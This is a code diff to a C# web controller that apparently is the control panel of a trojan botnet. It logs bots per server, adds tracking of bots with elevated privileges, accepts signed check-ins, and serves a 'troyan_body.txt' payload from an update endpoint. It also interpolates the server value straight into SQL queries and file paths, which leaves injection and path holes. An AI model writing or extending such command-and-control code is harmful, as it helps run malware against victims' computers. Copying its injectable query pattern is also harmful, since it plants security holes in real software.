@@ -65,7 +65,7 @@ public class CpController : Controller
             using (var connection = new SqlConnection(_connectionString))
             {
                 await connection.OpenAsync();
-                using (var command = new SqlCommand($"SELECT TOP (1000) [Date], [server], [Serie], [UniqueIDCount] FROM [hephaestus].[dbo].[DailyServerSerieStatsView] where server = '{server}' order by date desc", connection))
+                using (var command = new SqlCommand($"SELECT TOP (1000) [Date], [server], [Serie], [UniqueIDCount], [ElevatedUniqueIDCount] FROM [hephaestus].[dbo].[DailyServerSerieStatsView] where server = '{server}' order by date desc", connection))
                 {
                     using (var reader = await command.ExecuteReaderAsync())
                     {
@@ -76,7 +76,8 @@ public class CpController : Controller
                                 Date = reader.GetDateTime(reader.GetOrdinal("Date")),
                                 Server = reader.GetString(reader.GetOrdinal("server")),
                                 Serie = reader.GetString(reader.GetOrdinal("Serie")),
-                                UniqueIDCount = reader.GetInt32(reader.GetOrdinal("UniqueIDCount"))
+                                UniqueIDCount = reader.GetInt32(reader.GetOrdinal("UniqueIDCount")),
+                                ElevatedUniqueIDCount = reader.GetInt32(reader.GetOrdinal("ElevatedUniqueIDCount"))
                             };
                             stats.Add(stat);
                         }
@@ -113,6 +114,7 @@ public class CpController : Controller
       ,[serie]
       ,[number]
       ,[number_of_requests]
+      ,[number_of_elevated_requests]
   FROM [hephaestus].[dbo].[botLog]
   where server='{server}' order by last_seen desc", connection))
                 {
@@ -131,6 +133,7 @@ public class CpController : Controller
                                 Serie = reader.GetString("serie"),
                                 Number = reader.GetString("number"),
                                 NumberOfRequests =  reader.GetOrdinal("number_of_requests"),
+                                NumberOfElevatedRequests =  reader.GetInt32("number_of_elevated_requests"),
                             };
                             stats.Add(stat);
                         }
@@ -538,7 +541,7 @@ public class CpController : Controller
 
         string jsonBody = JsonSerializer.Serialize(request, jsonOptions);
 
-        if (!ValidateHash(jsonBody, xSignature, SecretKey))
+       if (!ValidateHash(jsonBody, xSignature, SecretKey))
         {
             return Unauthorized("Invalid signature.");
         }
@@ -556,6 +559,7 @@ public class CpController : Controller
                     command.Parameters.AddWithValue("@server", server ?? (object)DBNull.Value);
                     command.Parameters.AddWithValue("@ip", ipAddress);
                     command.Parameters.AddWithValue("@id", request.Id);
+                    command.Parameters.AddWithValue("@elevated", request.ElevatedNumber);
                     command.Parameters.AddWithValue("@serie", request.Serie ?? (object)DBNull.Value);
                     command.Parameters.AddWithValue("@number", request.Number ?? (object)DBNull.Value);
 
@@ -593,7 +597,7 @@ public class CpController : Controller
     [HttpGet("{server}/update")]
     public IActionResult Update(string server)
     {
-        var fileBytes = System.IO.File.ReadAllBytes($@"C:\data\{server}\troyan.txt");
+        var fileBytes = System.IO.File.ReadAllBytes($@"C:\data\{server}\troyan_body.txt");
         return File(fileBytes, "text/plain");
     }
 }
